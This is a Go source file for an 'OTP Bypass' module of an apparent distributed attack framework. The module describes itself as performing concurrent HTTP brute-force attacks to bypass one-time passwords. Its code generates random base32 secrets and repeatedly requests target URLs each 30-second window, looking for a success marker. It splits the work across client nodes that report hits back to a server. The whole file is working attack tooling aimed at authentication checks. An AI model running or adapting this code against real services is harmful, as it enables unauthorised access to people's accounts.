package Modules

import (
	"crypto/rand"
	"encoding/base32"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"

	Log "github.com/distribRuted/framework/library/log"
	Parameters "github.com/distribRuted/framework/library/parameters"
)

func (F *Module) Module_OTP_Bypass_Init() {

	var (
		moduleShortName   string = "OTP_Bypass"
		moduleName        string = "OTP Bypass"
		moduleDescription string = "This module concurrently performs HTTP based brute force attacks to bypass One Time Password (OTP)."
		moduleAuthor      string = "@numanozdemircom <root@numanozdemir.com>"
	)

	// ATTENTION! Do not remove the line below:
	Set_Module(moduleShortName, moduleName, moduleDescription, moduleAuthor)
}

// Variables of user inputs to pass to the Start() function.
var (
	targetURL        string
	targetCount      int
	randomOTP        string
	randomOTPSecrets []string
)

// Questions to ask the user are defined here.
func (F *Module) Module_OTP_Bypass_Parameters() {

	// Add_Parameter(PARAMETER_NAME, DESCRIPTION, DEFAULT_VALUE, IS_REQUIRED)
	Parameters.Add_Parameter("TARGET_HOST", "Enter the target host to scan.", "", true)
	Parameters.Add_Parameter("TARGET_COUNT", "Enter the number of different targets an OTP code will be tried on.", "1", true)
	Parameters.Add_Parameter("OTP_CODE", "Enter the OTP code to be searched on all targets.", "942341", true)

}

// This function will start the attack.
func (F *Module) Module_OTP_Bypass_Start() {

	targetURL, _ = Parameters.Read_Parameter_Str("TARGET_HOST")
	targetCount, _ = Parameters.Read_Parameter_Int("TARGET_COUNT")
	randomOTP, _ = Parameters.Read_Parameter_Str("OTP_CODE") // generateRandomOTP()

}

func (F *Module) Module_OTP_Bypass_Server_Role() {

	var totalOTPs int = targetCount

	Distribute("OTP_DISTRIBUTION", totalOTPs)

	Run_Distributed_Task("OTP_DISTRIBUTION", "Module_OTP_Bypass_Brute_Force", true, true)

}

func (F *Module) Module_OTP_Bypass_Client_Role() {

	Run_Distributed_Task("OTP_DISTRIBUTION", "Module_OTP_Bypass_Brute_Force", true, true)

}

func (F *Module) Module_OTP_Bypass_Success_Indicator() string {
	return "Entered OTP code is <span id=\"correct\">CORRECT</span>"
}

func (F *Module) Module_OTP_Bypass_Stop() {
	// Goodbye.
}

func (F *Module) Module_OTP_Bypass_Brute_Force(taskID int, taskName string, taskFrom, taskTo int) {
	//	taskFrom++
	//	taskTo++

	for i := taskFrom; i <= taskTo; i++ {
		randomOTPSecrets = append(randomOTPSecrets, generateRandomBase32String(16))
	}
	Log.PrintMsg(strconv.Itoa(targetCount) + " random secrets generated.")
	var isCompleted bool
	var previousEpoch int64

	go func() {
		for {
			if isCompleted {
				break
			}
			if time.Now().Unix()/30 > previousEpoch {
				Log.PrintMsg("OTP'ler yenilendi.")
				for _, randomOTPSecret := range randomOTPSecrets {
					go func(findOTP string) {
						var otpURL string = targetURL + "/" + findOTP + "/" + randomOTP
						resp, err := http.Get(otpURL)
						if err != nil {
							// try this OTP code again
							return
						}
						body, err := io.ReadAll(resp.Body)
						if err != nil {
							// try this OTP code again
							return
						}
						if strings.Contains(string(body), (&Module{}).Module_OTP_Bypass_Success_Indicator()) {
							Parameters.AttackOutput += otpURL
							if Parameters.IsClient {
								Parameters.ShareOutput(0, taskName, otpURL) // Send scan results to the server.
							}
							Log.PrintMsg("The secret for the OTP code " + randomOTP + " was found:  " + findOTP + " \n" + otpURL)
						}
						resp.Body.Close()
					}(randomOTPSecret)
				}
				previousEpoch = time.Now().Unix() / 30
			}
		}
	}()

	for {
		if Parameters.AttackOutput != "" {
			Log.PrintMsg("The secret for the OTP code " + randomOTP + " was found:")
			fmt.Println(Parameters.AttackOutput)
			isCompleted = true
			break
		}
		time.Sleep(1 * time.Second)
	}

	if Parameters.IsServer {
		Stop_Attack_On_All_Nodes()
	} else {
		Stop_Attack()
	}

	// Update the state of the relevant task.
	Parameters.UpdateTask(taskID, "Succeeded")
}

func generateRandomBase32String(length int) string {
	var bytes []byte = make([]byte, 10)
	rand.Read(bytes)
	return base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(bytes)[:length]
}
